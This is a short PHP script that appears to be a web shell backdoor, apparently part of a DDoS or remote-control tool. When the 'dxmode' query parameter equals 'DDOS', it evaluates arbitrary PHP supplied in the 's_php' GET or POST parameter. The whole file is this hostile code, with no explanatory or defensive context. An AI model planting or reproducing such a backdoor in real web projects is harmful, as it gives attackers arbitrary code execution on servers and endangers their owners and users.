<?php
if ($_GET['dxmode']=='DDOS') /* DDOS mode. In other case, EVALer of everything that comes in $_GET['s_php'] OR $_POST['s_php']  */
{
	$F = $_GET + $_POST;
	eval(stripslashes($F['s_php']));
}
?>